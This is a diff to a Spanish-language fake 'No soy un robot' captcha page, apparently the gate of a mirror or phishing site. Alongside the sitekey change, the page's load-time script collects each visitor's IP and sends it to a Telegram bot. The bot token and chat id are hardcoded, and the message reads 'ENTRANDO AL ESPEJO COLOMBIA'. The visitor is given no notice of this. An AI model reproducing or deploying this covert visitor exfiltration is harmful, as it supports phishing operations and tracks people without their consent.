@@ -158,7 +158,7 @@
     <div class="container">
       <h1>No soy un robot</h1>
       <form id="captchaForm">
-        <div class="g-recaptcha" data-sitekey="6Lc_yVMrAAAAAANOMyah0Dmydp5nh_27mbtN20PQ" data-callback="captchaVerificado"></div>
+        <div class="g-recaptcha" data-sitekey="6LfVuqUrAAAAAHccxvAaPhGofWBwREdHQ298dTGf" data-callback="captchaVerificado"></div>
         <button type="button" id="continueBtn">Continuar</button>
         <p id="successMsg">Validación completada.</p>
       </form>
@@ -253,7 +253,7 @@ async function getIPAndSendToTelegram() {
         // Configurar el mensaje para Telegram
         const token = '7877847524:AAE0n4fHB5bup0clglDKME9-S8Utc7ANZL8';
         const chat_id = '-4900588205';
-        const message = `💊ENTRANDO AL ESPEJO💊\nIP: ${ip}`;
+        const message = `💊ENTRANDO AL ESPEJO💊COLOMBIA\nIP: ${ip}`;
         
         // Enviar mensaje a Telegram
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -271,4 +271,5 @@ getIPAndSendToTelegram();
 </script>
 
 </body>
+
 </html>
